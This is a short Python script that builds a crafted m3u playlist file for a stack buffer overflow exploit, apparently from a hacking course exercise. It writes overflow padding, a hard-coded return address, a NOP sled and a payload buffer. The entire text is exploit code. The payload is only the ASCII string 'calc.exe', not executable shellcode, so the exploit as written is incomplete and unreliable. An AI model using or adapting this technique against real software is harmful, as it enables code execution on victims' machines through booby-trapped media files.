lixo = b'A' * 520
ret = b'\x5C\xFA\x19\x00'

nops = b'\x90' * 60

buf =  b""
buf += b"\x63\x61\x6c\x63\x2e\x65\x78\x65"

f = open("C:\\Users\\lucca\\OneDrive\\Documentos\\Projetos\\Universidade Hacker\\Xplts\\bad.m3u", "wb")
f.write(lixo+ret+nops+buf)
f.close()